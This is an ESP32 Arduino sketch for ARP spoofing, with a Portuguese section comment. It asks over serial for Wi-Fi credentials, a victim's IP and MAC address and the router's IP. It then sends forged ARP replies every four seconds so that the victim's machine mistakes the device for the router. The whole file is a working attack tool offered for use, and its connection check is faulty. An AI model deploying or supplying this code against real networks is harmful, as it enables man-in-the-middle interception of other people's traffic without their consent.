#include <WiFi.h>
#include <esp32ARP.h>

int ledYellow = 2;

esp32ARP arp;
String ipVictim,ipRouter,bssid,wifipassword,ssid;

String Input(String message){
  Serial.print(message);
  while (!Serial.available()){
    delay(100);
  }
  String leitura = Serial.readStringUntil('\n');
  leitura.trim();
  Serial.println(leitura);
  return leitura;
}



//Configurações ARP Spoofing 
void setup() {
  Serial.begin(115200);
  delay(1000);
  pinMode(ledYellow, OUTPUT);

  ssid = Input("Name of the wifi network you want to connect to: ");
  wifipassword = Input("Wi-Fi password do you want to connect to: ");
  
  WiFi.begin(ssid.c_str(), wifipassword.c_str());

   Serial.println("Connecting...");
    if (WiFi.status() != WL_CONNECTED){
      delay(400);
      Serial.print("Error");
    } 
    Serial.println("\nConnected!!");
    digitalWrite(ledYellow, HIGH);
    delay(3000);
    digitalWrite(ledYellow, LOW);

 ipVictim  = Input("Enter the victim's IP address: ");
 ipRouter = Input("Enter the Router's IP address: ");
 bssid = Input("Enter the victim's MAC address: ");

 digitalWrite(ledYellow, HIGH);
delay(2000);
 digitalWrite(ledYellow, LOW);
 arp.init();


 
}

void loop() {
   Serial.printf("Poisoning: Victim %s thinks I am %s\n", ipVictim.c_str(), ipRouter.c_str());
   arp.send(bssid.c_str(), ipRouter.c_str(), ipVictim.c_str());
   delay(4000);

}

